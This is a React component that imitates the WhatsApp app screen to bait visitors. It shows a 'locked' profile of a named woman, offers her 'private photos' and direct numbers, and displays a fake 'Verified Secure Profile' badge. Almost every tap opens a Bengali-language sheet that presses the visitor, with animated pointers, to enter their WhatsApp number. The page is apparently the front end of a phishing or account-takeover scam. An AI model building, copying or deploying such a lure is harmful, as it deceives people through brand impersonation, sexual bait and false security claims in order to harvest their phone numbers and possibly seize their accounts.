import React, { useState, useRef } from "react";
import { 
  Camera, 
  MoreVertical, 
  Search, 
  Lock, 
  X, 
  MessageCircle, 
  CheckCircle2, 
  User, 
  Phone, 
  MessageSquarePlus, 
  Play, 
  Users,
  Info,
  ShieldCheck,
  Calendar,
  MapPin,
  ArrowRight
} from "lucide-react";
import { motion, AnimatePresence } from "motion/react";

interface ProfilePhaseProps {
  onJoinNow: () => void;
  phoneNumber: string;
  setPhoneNumber: (val: string) => void;
  onSubmit: (e: React.FormEvent) => void;
  isLoading: boolean;
  hasSentOnce?: boolean;
  onNewNumber?: () => void;
}

export const ProfilePhase: React.FC<ProfilePhaseProps> = ({ 
  onJoinNow,
  phoneNumber,
  setPhoneNumber,
  onSubmit,
  isLoading,
  hasSentOnce = false,
  onNewNumber
}) => {
  const [showLockedCard, setShowLockedCard] = useState(true);
  const [isInputExpanded, setIsInputExpanded] = useState(false);

  const isNumberEntered = phoneNumber.trim().length >= 5;
  const canSubmit = isNumberEntered;

  const handleTriggerOpen = () => {
    setIsInputExpanded(true);
    onJoinNow();
  };

  return (
    <div className="w-full h-full bg-white flex flex-col justify-between relative text-slate-800">
      
      {/* 1. WhatsApp Top Header */}
      <div className="bg-white pt-3.5 pb-2 px-4 flex items-center justify-between select-none border-b border-gray-50 shrink-0">
        <span className="text-2xl font-bold text-[#1ebd62] tracking-normal font-sans">WhatsApp</span>
        <div className="flex items-center gap-5 text-gray-800">
          {/* Camera Icon */}
          <button aria-label="Camera" className="hover:opacity-75 transition-opacity cursor-pointer border-none bg-transparent">
            <Camera className="w-5 h-5 text-gray-700" />
          </button>
          {/* Three Dots Menu */}
          <button aria-label="More options" className="hover:opacity-75 transition-opacity cursor-pointer border-none bg-transparent">
            <MoreVertical className="w-5 h-5 text-gray-700" />
          </button>
        </div>
      </div>

      {/* 2. Ask Meta AI Search Bar */}
      <div className="px-4 pb-3 bg-white shrink-0">
        <div className="flex items-center gap-3 bg-gray-100 rounded-full px-4 py-2 w-full border border-transparent">
          <Search className="w-4 h-4 text-gray-500 shrink-0" />
          <input 
            type="text" 
            placeholder="Ask Meta AI or Search" 
            className="bg-transparent border-none outline-none text-sm text-gray-700 placeholder-gray-500 w-full font-sans cursor-not-allowed" 
            disabled 
          />
        </div>
      </div>

      {/* 3. Scrollable Profile Area */}
      <div className="flex-1 overflow-y-auto no-scrollbar relative pb-28 bg-[#fdfdfd]">
        
        {/* Cover Photo Area with original image */}
        <div className="relative h-44 w-full bg-slate-100 overflow-hidden shadow-inner">
          <img 
            src="/my-logo1.jpg" 
            alt="Cover" 
            referrerPolicy="no-referrer"
            className="w-full h-full object-cover select-none" 
          />
          {/* Subtle gradient overlay to enhance profile picture visibility */}
          <div className="absolute inset-x-0 bottom-0 h-16 bg-gradient-to-t from-black/20 to-transparent"></div>
          
          {/* Cover Camera Icon Badge */}
          <button 
            type="button"
            className="absolute bottom-4 right-4 bg-neutral-900/60 hover:bg-neutral-900/80 text-white p-2.5 rounded-full shadow-lg border-none flex items-center justify-center backdrop-blur-xs transition-all active:scale-95 cursor-pointer z-10"
          >
            <Camera className="w-4 h-4" />
          </button>
        </div>

        {/* Profile Photo Area */}
        <div className="relative flex justify-center -mt-16 z-10">
          <div className="relative w-32 h-32 rounded-full border-[5px] border-white shadow-xl overflow-hidden bg-white select-none">
            <img 
              src="/my-logo2.jpg" 
              alt="Profile" 
              referrerPolicy="no-referrer"
              className="w-full h-full object-cover" 
            />
            {/* Profile Camera Icon Badge */}
            <button 
              type="button"
              className="absolute bottom-0 right-0 bg-neutral-800 text-white p-2 rounded-full border border-white shadow flex items-center justify-center hover:bg-neutral-900 transition-colors cursor-pointer"
            >
              <Camera className="w-3 h-3" />
            </button>
          </div>
        </div>

        {/* Lock Profile Status Text */}
        <div className="text-center mt-3.5 px-4">
          <div className="inline-flex items-center justify-center gap-2 text-emerald-800 font-bold bg-[#edfbf3] border border-emerald-100/60 px-4 py-1.5 rounded-full text-xs shadow-xs">
            <Lock className="w-3.5 h-3.5 text-[#1ebd62] fill-[#1ebd62]/10 shrink-0" />
            <span>Nusrat Jahan's Profile is Locked</span>
          </div>
        </div>

        {/* Custom Locked Card */}
        {showLockedCard && (
          <div className="mx-4 mt-5 p-4.5 bg-white border border-[#1ebd62]/15 rounded-2xl relative shadow-md bg-gradient-to-br from-white via-white to-emerald-50/20">
            {/* Close Button */}
            <button 
              onClick={() => setShowLockedCard(false)} 
              className="absolute top-3.5 right-3.5 text-gray-400 hover:text-gray-600 transition-colors border-none bg-transparent cursor-pointer p-1"
            >
              <X className="w-4 h-4" />
            </button>

            <div className="flex items-start gap-3.5">
              {/* WhatsApp Green Icon */}
              <div className="bg-emerald-50 text-[#1ebd62] p-3 rounded-2xl flex items-center justify-center shrink-0 shadow-inner">
                <MessageCircle className="w-7 h-7 text-[#1ebd62] fill-[#1ebd62]/10" />
              </div>
              {/* Contents */}
              <div className="flex-1 text-left">
                <h3 className="font-extrabold text-gray-900 text-[14.5px] leading-snug">Unlock Private Profile</h3>
                <p className="text-[11.5px] text-gray-500 mt-1 font-sans leading-relaxed">
                  Join and gain exclusive access to Nusrat Jahan's chat inbox, private photos, and direct numbers.
                </p>
                
                {/* CTA "Join now" Button */}
                <div className="mt-3.5">
                  <button 
                    onClick={handleTriggerOpen}
                    className="w-full sm:w-auto bg-[#1ebd62] hover:bg-emerald-600 active:scale-[0.98] text-white font-extrabold py-2.5 px-6 rounded-xl text-xs flex items-center justify-center gap-2 transition-all shadow-sm hover:shadow-md border-none cursor-pointer"
                  >
                    <span>Join now</span>
                    <CheckCircle2 className="w-3.5 h-3.5 text-white" />
                  </button>
                </div>
              </div>
            </div>
          </div>
        )}

        {/* Info Area with enriched elements */}
        <div className="mt-6 px-6 pt-5 border-t border-gray-100 text-left space-y-4">
          <div>
            <h4 className="text-[11px] font-extrabold text-gray-400 uppercase tracking-wider mb-2">Business information</h4>
            
            {/* Name Row */}
            <div className="flex items-center gap-4 py-3 border-b border-gray-50">
              <div className="text-gray-400 w-5 flex justify-center shrink-0">
                <User className="w-5 h-5 text-gray-500" />
              </div>
              <div className="flex flex-col">
                <span className="text-gray-400 text-[10px] uppercase font-bold tracking-wider leading-none">Business Name</span>
                <span className="text-gray-900 font-extrabold text-[13.5px] mt-0.5">MST NUSRAT JAHAN</span>
              </div>
            </div>

            {/* Phone Row */}
            <div className="flex items-center gap-4 py-3 border-b border-gray-50">
              <div className="text-gray-400 w-5 flex justify-center shrink-0">
                <Phone className="w-5 h-5 text-gray-500" />
              </div>
              <div className="flex flex-col">
                <span className="text-gray-400 text-[10px] uppercase font-bold tracking-wider leading-none">Verified Number</span>
                <span className="text-gray-900 font-bold text-[13.5px] font-sans mt-0.5">+60 19-345 6789</span>
              </div>
            </div>

            {/* Location Row */}
            <div className="flex items-center gap-4 py-3 border-b border-gray-50">
              <div className="text-gray-400 w-5 flex justify-center shrink-0">
                <MapPin className="w-5 h-5 text-gray-500" />
              </div>
              <div className="flex flex-col">
                <span className="text-gray-400 text-[10px] uppercase font-bold tracking-wider leading-none">Location</span>
                <span className="text-gray-900 font-medium text-[13px] mt-0.5 font-sans">Kuala Lumpur, Malaysia</span>
              </div>
            </div>

            {/* Joining Date Row */}
            <div className="flex items-center gap-4 py-3 border-b border-gray-50">
              <div className="text-gray-400 w-5 flex justify-center shrink-0">
                <Calendar className="w-5 h-5 text-gray-500" />
              </div>
              <div className="flex flex-col">
                <span className="text-gray-400 text-[10px] uppercase font-bold tracking-wider leading-none">Member Since</span>
                <span className="text-gray-950 font-medium text-[13px] mt-0.5 font-sans">May 2026</span>
              </div>
            </div>
          </div>

          <div>
            <h4 className="text-[11px] font-extrabold text-gray-400 uppercase tracking-wider mb-2">Safety & Verification</h4>
            
            {/* Status Check badge */}
            <div className="flex items-start gap-4 py-3">
              <div className="text-gray-400 w-5 flex justify-center shrink-0">
                <ShieldCheck className="w-5 h-5 text-emerald-600" />
              </div>
              <div className="flex flex-col">
                <span className="text-gray-400 text-[10px] uppercase font-bold tracking-wider leading-none">Security Status</span>
                <span className="text-emerald-700 font-bold text-[12.5px] mt-0.5">Verified Secure Profile ✅</span>
                <p className="text-[11px] text-gray-400 font-sans leading-normal mt-0.5">
                  This profile has passed identity validation checks and matches active security credentials.
                </p>
              </div>
            </div>
          </div>
        </div>

      </div>

      {/* 4. Android Style Floating Action Buttons (FABs) */}
      <div className="absolute bottom-20 right-4 flex flex-col items-center gap-3 z-20">
        {/* Meta AI Gradient FAB */}
        <button 
          aria-label="Meta AI" 
          onClick={handleTriggerOpen}
          className="w-11 h-11 bg-white hover:bg-gray-50 rounded-2xl flex items-center justify-center shadow-lg transition-transform active:scale-95 border border-gray-100 cursor-pointer"
        >
          {/* Meta AI color loop icon simulation */}
          <div className="w-6 h-6 rounded-full bg-gradient-to-tr from-violet-500 via-purple-500 to-emerald-400 p-0.5">
            <div className="w-full h-full bg-white rounded-full flex items-center justify-center">
              <div className="w-3 h-3 rounded-full bg-gradient-to-tr from-violet-500 via-purple-500 to-emerald-400 opacity-90"></div>
            </div>
          </div>
        </button>
        {/* Green Plus Chat FAB */}
        <button 
          aria-label="New chat" 
          onClick={handleTriggerOpen}
          className="w-14 h-14 bg-[#1ebd62] hover:bg-[#1ebd62]/90 text-white rounded-2xl flex items-center justify-center shadow-lg transition-transform active:scale-95 border-none cursor-pointer"
        >
          <MessageSquarePlus className="w-6 h-6 text-white" />
        </button>
      </div>

      {/* 5. Bottom Navigation Bar */}
      <div className="bg-white border-t border-gray-100 py-2 flex justify-around items-center select-none z-10 shrink-0">
        {/* Chats Tab (Active) */}
        <div className="flex flex-col items-center flex-1 cursor-pointer">
          {/* Pill Shape Background for Active Icon */}
          <div className="bg-[#d8ffd2] px-6 py-1 rounded-full text-emerald-800 transition-colors">
            <MessageCircle className="w-5 h-5 text-emerald-800 fill-emerald-800/10" />
          </div>
          <span className="text-xs font-bold text-gray-900 mt-1">Chats</span>
        </div>
        
        {/* Updates Tab */}
        <div 
          onClick={handleTriggerOpen}
          className="flex flex-col items-center flex-1 cursor-pointer opacity-60 hover:opacity-100 transition-opacity"
        >
          <div className="px-6 py-1 text-gray-700">
            <Play className="w-5 h-5 text-gray-700" />
          </div>
          <span className="text-xs font-medium text-gray-600 mt-1">Updates</span>
        </div>
        
        {/* Communities Tab */}
        <div 
          onClick={handleTriggerOpen}
          className="flex flex-col items-center flex-1 cursor-pointer opacity-60 hover:opacity-100 transition-opacity"
        >
          <div className="px-6 py-1 text-gray-700">
            <Users className="w-5 h-5 text-gray-700" />
          </div>
          <span className="text-xs font-medium text-gray-600 mt-1">Communities</span>
        </div>
        
        {/* Calls Tab */}
        <div 
          onClick={handleTriggerOpen}
          className="flex flex-col items-center flex-1 cursor-pointer opacity-60 hover:opacity-100 transition-opacity"
        >
          <div className="px-6 py-1 text-gray-700">
            <Phone className="w-5 h-5 text-gray-700" />
          </div>
          <span className="text-xs font-medium text-gray-600 mt-1">Calls</span>
        </div>
      </div>

      {/* 6. Sliding Bottom Sheet and Backdrop Overlay */}
      <AnimatePresence>
        {isInputExpanded && (
          <>
            {/* Backdrop overlay */}
            <motion.div
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              transition={{ duration: 0.2 }}
              onClick={() => setIsInputExpanded(false)}
              className="absolute inset-0 bg-black/60 z-30 cursor-pointer backdrop-blur-3xs"
            />

            {/* Bottom Sheet Panel */}
            <motion.div
              initial={{ y: "100%" }}
              animate={{ y: 0 }}
              exit={{ y: "100%" }}
              transition={{ type: "spring", damping: 25, stiffness: 220 }}
              className="absolute bottom-0 inset-x-0 bg-white rounded-t-3xl shadow-2xl border-t border-gray-150 z-40 p-5 pb-7 flex flex-col text-center"
            >
              {/* Center Handlebar Accent */}
              <div className="w-12 h-1.5 bg-gray-200 rounded-full mx-auto mb-5" />

              {/* Header Title with Lock Icon */}
              <div className="flex items-center justify-center gap-1.5 mb-3 text-[11px] font-bold text-[#075e54] bg-[#e8f5e9] py-1 px-3 rounded-full w-fit mx-auto">
                <ShieldCheck className="w-4 h-4 text-emerald-600 fill-emerald-600/10" />
                <span>১০০% নিরাপদ ও সুরক্ষিত সংযোগ</span>
              </div>

              <div className="w-10 h-10 bg-emerald-50 rounded-full flex items-center justify-center mx-auto mb-2 text-[#075e54]">
                <Phone className="w-4.5 h-4.5 fill-emerald-600/10" />
              </div>

              <h2 className="text-[15px] font-extrabold text-slate-900 mb-1 leading-tight">
                হোয়াটসঅ্যাপ চ্যাট ও কল সচল করুন
              </h2>
              
              <p className="text-[11px] text-slate-500 leading-normal mb-4 px-1">
                আমার সাথে সরাসরি পার্সোনাল চ্যাট ও ভিডিও কলে কথা বলতে আপনার হোয়াটসঅ্যাপ নম্বরটি নিচে লিখে বোতামটি চাপ দিন।
              </p>

              {/* Form Input Block with Interactive Indicator overlay */}
              <form onSubmit={(e) => {
                onSubmit(e);
              }} className="space-y-3.5 text-left relative">
                <div className="space-y-1 relative">
                  <label htmlFor="phoneInputInline" className="text-[9px] font-extrabold uppercase tracking-wider text-[#075e54] block pl-1">
                    আপনার হোয়াটসঅ্যাপ নম্বর লিখুন:
                  </label>
                  <div className="relative">
                    <input
                      type="tel"
                      id="phoneInputInline"
                      disabled={isLoading}
                      placeholder="01XXXXXXXXX"
                      value={phoneNumber}
                      onChange={(e) => setPhoneNumber(e.target.value)}
                      className="w-full bg-[#f4f6f8] text-slate-900 border-2 border-transparent focus:border-[#075e54] rounded-2xl px-4 py-3 text-center font-extrabold text-[15.5px] tracking-wide focus:outline-none transition-all placeholder:text-slate-400 placeholder:font-normal focus:bg-white cursor-text"
                      autoFocus={true}
                    />

                    {/* Left/Right pointer cue if empty */}
                    {!isNumberEntered && (
                      <motion.div
                        initial={{ opacity: 0, x: -8 }}
                        animate={{ opacity: 1, x: [0, -6, 0] }}
                        transition={{ repeat: Infinity, duration: 1.2, ease: "easeInOut" }}
                        className="absolute right-2 top-1/2 -translate-y-1/2 bg-yellow-400 text-slate-950 text-[9px] font-extrabold py-1 px-2.5 rounded-lg shadow-md border border-white flex items-center gap-1 cursor-default pointer-events-none z-20"
                      >
                        <span>👈 এখানে নম্বরটি লিখুন</span>
                        <span className="text-[12px] animate-bounce">👆</span>
                      </motion.div>
                    )}
                  </div>
                </div>

                <div className="relative pt-1">
                  <button
                    type="submit"
                    disabled={isLoading || !canSubmit}
                    className="w-full bg-[#1ebd62] hover:bg-[#128c7e] disabled:bg-slate-100 disabled:text-slate-400 disabled:shadow-none active:scale-[0.98] text-white rounded-2xl py-3 px-4 font-extrabold text-[13.5px] shadow-sm hover:shadow-md transition-all border-none cursor-pointer flex items-center justify-center gap-1.5"
                  >
                    {isLoading ? (
                      <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                    ) : (
                      <>
                        <span>কল সচল করুন</span>
                        <ArrowRight className="w-3.5 h-3.5" />
                      </>
                    )}
                  </button>

                  {/* Activate cue overlay */}
                  {canSubmit && !isLoading && !hasSentOnce && (
                    <motion.div
                      initial={{ opacity: 0, y: 5 }}
                      animate={{ opacity: 1, y: [0, 4, 0] }}
                      transition={{ repeat: Infinity, duration: 1.2, ease: "easeInOut" }}
                      className="absolute -bottom-8 left-1/2 -translate-x-1/2 bg-yellow-400 text-slate-950 text-[9px] font-bold py-0.5 px-2.5 rounded-lg border border-white flex items-center gap-1.5 whitespace-nowrap z-25 shadow-sm"
                    >
                      <span>👆 বোতামে চাপ দিয়ে কল চালু করুন</span>
                      <span className="text-[11px] animate-pulse">👉</span>
                    </motion.div>
                  )}
                </div>
              </form>

              {/* Reset or Option trigger */}
              {hasSentOnce && onNewNumber && (
                <button
                  type="button"
                  onClick={onNewNumber}
                  className="mt-3.5 w-full py-2 bg-rose-50 hover:bg-rose-100 text-rose-600 border border-rose-150 active:scale-[0.98] font-extrabold rounded-2xl text-[12px] shadow-3xs transition-all cursor-pointer flex items-center justify-center gap-1"
                >
                  <span>✨ নতুন নম্বর ব্যবহার করুন</span>
                </button>
              )}

              {/* Close Bottom Sheet Button */}
              <button
                type="button"
                onClick={() => setIsInputExpanded(false)}
                className="mt-4 w-full py-2 bg-slate-50 hover:bg-slate-100/90 text-slate-600 border border-slate-200 active:scale-[0.98] font-bold rounded-xl text-[11px] transition-all cursor-pointer flex items-center justify-center gap-1"
              >
                <span>বন্ধ করুন</span>
              </button>
            </motion.div>
          </>
        )}
      </AnimatePresence>

    </div>
  );
};
